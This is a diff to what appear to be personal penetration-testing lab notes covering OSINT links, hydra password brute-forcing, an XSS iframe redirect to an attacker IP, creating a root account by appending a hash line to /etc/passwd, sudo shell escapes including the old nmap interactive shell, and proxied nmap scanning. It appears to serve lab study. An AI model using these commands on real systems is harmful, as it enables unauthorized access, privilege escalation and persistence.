@@ -20,6 +20,8 @@ Passive information gathering; from the customer, from the web, from hardware we
 spiderfoot
 -xf tools to find metadata in documents, like author of pdf’s, .docx’s, etc
 
+ https://osintframework.com/   <--- awesome resource for web-based OSINT tools, point you in the right direction
+
 Google dorks:
 "site:"
 "filetype:"
@@ -452,6 +454,12 @@ hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-get-for
 
 Use  -u to loop around your list of users (-L), not passwords <-- always use if using a list of users, along with -e nsr for common permutations
 
+
+ffuf -w paths.txt -u https://example.net/fuzz
+BurpSuite Intruder suite
+
+
+
 XSS
 Browser redirection in an iframe:
 <iframe SRC="http://10.11.0.5/report" height = "0" width ="0"></iframe>
@@ -859,17 +867,24 @@ cipher /w:[file]         (writes all zeros, then all 1s (0xFF), then random numb
 look this up:
 windows-exploit-suggester.py
 
+transfer payloads to windows:
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/
+
+
 
 Linux add sudo user 
 adduser bill   (set password at prompt)
 echo 'bill:badpassword'|chpasswd  (if you need non-interactive – or try)  
 usermod --password [PASSWORD] [USERNAME]    
-usermod -aG sudo bill           (add as sudo user)
+usermod -aG sudo bill           (add as sudo user)  (watch out for old distros that don't support the -a option)
 
 CentOS add sudo user
 adduser bill
 passwd bill
 usermod -aG wheel bill
+
+alternately non-interactive way to add user in linux:
+useradd -m -s /bin/bash bill
 
 Modify sudoers file
 -normally on a system you use visudo to change this file (as sudo or root). On target, you may want to simply copy the file, then uncomment the below line:
@@ -1032,6 +1047,7 @@ run hashdump
 
 Linux:
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/
 
 Scripts to automate:
 LinEnum     ./LinEnum.sh -e /tmp/export.txt
@@ -1055,6 +1071,13 @@ Abuse SUID binaries (text editor):
 perl -e ‘print crypt("YourPasswd", "salt"),"\n"'
 perl -e ‘print crypt("bob", "bob"),"\n"’
 (use text editor, or echo/tee) sudo echo ‘bob:boJIq0xJ2/a6M:0:0:root:/root:/bin/bash’ >> /etc/passwd
+(newer method for generating linux hash:)
+echo 'badpassword' | openssl passwd -1 -stdin
+$1$R5LeHFZy$OJvfAbRCbCMgFvLDonMjN1
+(use text editor, or echo/tee) sudo echo ‘bill:$1$R5LeHFZy$OJvfAbRCbCMgFvLDonMjN1:0:0:root:/root:/bin/bash’ >> /etc/passwd
+(might have to copy the file and edit it in a proper unix editor, then copy back over, if the OS is old or uncooperative)
+(also may not work to include the hash in /etc/passwd, may need to actually edit /etc/shadow and put an appropriate entry)
+
 
 Look for plaintext creds
 grep -r “password” /etc    (add other directories)
@@ -1071,6 +1094,11 @@ sudo vim -c ‘!sh’
 sudo -u root vim -c ‘!sh’
 sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’
 sudo find /home -exec sh -I \;
+
+sudo nmap --interactive     (old versions of nmap have this)
+nmap> !sh
+root$ 
+
 
 kernel exploit? Does target have compiler or required languages installed on it, or do you need to recreate the environment? gcc -m32 --static    (possibly copy gcc over into /tmp… painful)
 security misconfiguration in a piece of software?
@@ -1264,6 +1292,9 @@ web enumeration example: proxychains4 whatweb http://10.11.1.39
 possible way to speed scans up, blogpost below:
 https://www.hackwhackandsmack.com/?p=1021
 seq 1 1024 | xargs -P 50 -I{} proxychains4 nmap {} -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 10.11.1.39 -oG 39.nmap
+
+using nmap's built in proxy option (not well documented; but works with SSH dynamic tunnel)
+nmap -p 22,25,80,110,111,143,443,836,993,995,3306 -sT -Pn -sV --script=banner --proxy socks4://127.0.0.1:9050 10.11.1.217
 
 
 ncat
